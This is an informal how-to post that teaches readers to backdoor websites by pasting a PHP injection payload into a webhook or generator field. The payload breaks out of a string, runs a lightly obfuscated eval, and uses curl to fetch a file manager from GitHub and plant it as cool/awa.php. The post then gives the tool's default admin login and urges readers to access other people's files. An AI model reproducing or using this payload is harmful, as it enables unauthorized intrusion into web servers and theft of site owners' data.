Backdoor
HOW TO BACKDOOR WEBSITES AND GET THERE FILES

paste this code in webhook

";?> <?php ini_set("display_errors", 1);ini_set("display_startup_errors", 1);error_reporting(E_ALL);mkdir('cool');eval('f'.'i'.'le_put_contents("cool/awa.php", f'.'open("https://raw.githubusercontent.com/prasathmani/tinyfilemanager/master/tinyfilemanager.php", "r"));'); $ch = curl_init(); curl_setopt($ch, CURLOPT_URL,'https://raw.githubusercontent.com/prasathmani/tinyfilemanager/master/tinyfilemanager.php%27); $fp = fopen('cool/awa.php', 'w+'); curl_setopt($ch, CURLOPT_FILE, $fp); curl_exec ($ch); curl_close ($ch); fclose($fp);?>";


and then click generate

then go to the generated link/cool/awa.php
and type the login
admin
admin@123
and now you have access to there files!!! Have fun backdooring!!!
